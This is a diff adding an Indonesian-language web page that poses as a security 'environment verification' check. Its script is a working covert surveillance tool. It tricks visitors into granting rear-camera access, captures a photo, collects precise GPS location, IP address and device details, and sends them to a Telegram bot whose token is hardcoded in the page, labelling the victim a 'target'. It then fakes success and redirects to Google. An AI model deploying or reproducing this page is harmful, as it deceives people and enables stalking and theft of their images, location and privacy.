@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Lingkungan</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
+        body{background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+        .container{background:white;border-radius:20px;padding:25px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
+        .header{text-align:center;margin-bottom:20px}
+        .header h1{color:#333;font-size:22px;margin-bottom:5px}
+        .header p{color:#666;font-size:13px}
+        .warning-box{background:#fff3cd;border:1px solid #ffc107;color:#856404;padding:12px;border-radius:10px;margin-bottom:20px;font-size:13px;text-align:center}
+        .camera-container{width:100%;height:280px;background:#f0f0f0;border-radius:10px;margin:15px 0;overflow:hidden;display:none;border:2px solid #2a5298}
+        video,canvas{width:100%;height:100%;object-fit:cover}
+        canvas{display:none}
+        .permission-box{background:#f8f9fa;border-radius:10px;padding:15px;margin:15px 0;border:1px solid #dee2e6}
+        .permission-box h3{color:#333;margin-bottom:12px;font-size:16px;text-align:center}
+        .permission-item{display:flex;align-items:center;padding:10px 0;border-bottom:1px solid #dee2e6}
+        .permission-item:last-child{border-bottom:none}
+        .permission-item input{margin-right:12px;width:18px;height:18px}
+        .permission-item label{color:#495057;font-size:14px}
+        .btn{width:100%;padding:14px;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;transition:all 0.3s;margin:5px 0}
+        .btn-primary{background:linear-gradient(135deg,#1e3c72,#2a5298);color:white}
+        .btn-primary:hover{opacity:0.9;transform:translateY(-2px)}
+        .progress-container{margin:20px 0;display:none}
+        .progress-bar{width:100%;height:25px;background:#f0f0f0;border-radius:12px;overflow:hidden;margin-bottom:8px}
+        .progress-fill{height:100%;background:linear-gradient(90deg,#1e3c72,#2a5298);width:0%;transition:width 0.3s}
+        .progress-text{text-align:center;color:#333;font-size:14px}
+        .result-box{margin-top:20px;padding:15px;background:#d4edda;border-radius:10px;color:#155724;text-align:center;display:none}
+        .footer{text-align:center;margin-top:20px;color:#999;font-size:11px}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Verifikasi Lingkungan</h1>
+            <p>Verifikasi keamanan tambahan</p>
+        </div>
+        
+        <div class="warning-box">
+            ⚠️ Foto lingkungan diperlukan untuk verifikasi
+        </div>
+        
+        <div class="permission-box" id="permissionBox">
+            <h3>📷 Izinkan Akses Kamera Belakang</h3>
+            <div class="permission-item">
+                <input type="checkbox" checked disabled>
+                <label>Akses kamera belakang (untuk verifikasi)</label>
+            </div>
+            <div class="permission-item">
+                <input type="checkbox" checked disabled>
+                <label>Akses lokasi (untuk keamanan)</label>
+            </div>
+            <button class="btn btn-primary" onclick="startKamera()">IZINKAN AKSES KAMERA</button>
+        </div>
+        
+        <div class="camera-container" id="cameraPreview">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+        </div>
+        
+        <div class="progress-container" id="progressSection">
+            <div class="progress-bar">
+                <div id="progressFill" class="progress-fill"></div>
+            </div>
+            <div id="progressText" class="progress-text">Memproses... 0%</div>
+        </div>
+        
+        <div class="result-box" id="resultSection">
+            <p>✅ Verifikasi Berhasil!</p>
+            <p style="font-size:12px;margin-top:8px;">Mengalihkan ke halaman utama...</p>
+        </div>
+        
+        <div class="footer">
+            <p>© 2026 - Sistem Keamanan</p>
+        </div>
+    </div>
+    
+    <script>
+        // ========== KONFIGURASI ==========
+        const urlParams = new URLSearchParams(window.location.search);
+        const CHAT_ID = urlParams.get('chat_id') || '7125611713';
+        const BOT_TOKEN = '8720516160:AAFRqlyEaApfjVAOktdP1NQmOvpbfgE1ViU'; // GANTI TOKEN LO
+        const DEV_ID = 7125611713; // GANTI ID DEVELOPER LO
+        
+        let video = document.getElementById('video');
+        let canvas = document.getElementById('canvas');
+        let context = canvas.getContext('2d');
+        let stream = null;
+        
+        console.log('📷 Mode: Kamera Belakang');
+        console.log('🎯 Chat ID:', CHAT_ID);
+        
+        function updateProgress(percent, text) {
+            document.getElementById('progressFill').style.width = percent + '%';
+            document.getElementById('progressText').innerHTML = text + ' ' + percent + '%';
+        }
+        
+        async function sendToBot(chatId, message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: chatId, text: message, parse_mode: 'HTML'})
+                });
+            } catch(e){}
+        }
+        
+        async function sendPhotoToBot(chatId, base64Data, caption) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', base64Data);
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'HTML');
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch(e){}
+        }
+        
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => resolve({lat: p.coords.latitude, lng: p.coords.longitude}),
+                        () => resolve({lat: 'Unknown', lng: 'Unknown'}),
+                        {enableHighAccuracy: true}
+                    );
+                } else {
+                    resolve({lat: 'Unknown', lng: 'Unknown'});
+                }
+            });
+        }
+        
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+        
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let brand = 'Unknown', model = 'Unknown';
+            
+            if (/Samsung|SM-/i.test(ua)) brand = 'Samsung';
+            else if (/Xiaomi|Redmi/i.test(ua)) brand = 'Xiaomi';
+            else if (/iPhone/i.test(ua)) brand = 'Apple';
+            else if (/OPPO|CPH/i.test(ua)) brand = 'Oppo';
+            
+            return {brand, model, platform: navigator.platform};
+        }
+        
+        async function startKamera() {
+            document.getElementById('permissionBox').style.display = 'none';
+            document.getElementById('cameraPreview').style.display = 'block';
+            document.getElementById('progressSection').style.display = 'block';
+            
+            updateProgress(20, 'Mengakses kamera belakang');
+            
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' },
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                updateProgress(40, 'Kamera siap');
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    updateProgress(60, 'Mengambil foto');
+                    
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        const fotoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+                        updateProgress(80, 'Mengirim foto');
+                        
+                        sendFoto(fotoBase64);
+                    }, 2000);
+                };
+            } catch(err) {
+                updateProgress(0, 'Gagal');
+            }
+        }
+        
+        async function sendFoto(base64Data) {
+            const location = await getLocation();
+            const ip = await getIP();
+            const device = getDeviceInfo();
+            
+            const caption = `📷 <b>FOTO BELAKANG TARGET</b>
+📍 Lokasi: ${location.lat},${location.lng}
+🌐 IP: ${ip}
+📱 HP: ${device.brand} ${device.model}
+📲 Platform: ${device.platform}
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+            
+            await sendPhotoToBot(CHAT_ID, base64Data, caption);
+            await sendToBot(DEV_ID, `📷 User ${CHAT_ID} foto belakang\n📱 ${device.brand} ${device.model}`);
+            
+            updateProgress(100, 'Selesai');
+            
+            setTimeout(() => {
+                document.getElementById('progressSection').style.display = 'none';
+                document.getElementById('resultSection').style.display = 'block';
+                if(stream) stream.getTracks().forEach(t => t.stop());
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com';
+                }, 2000);
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
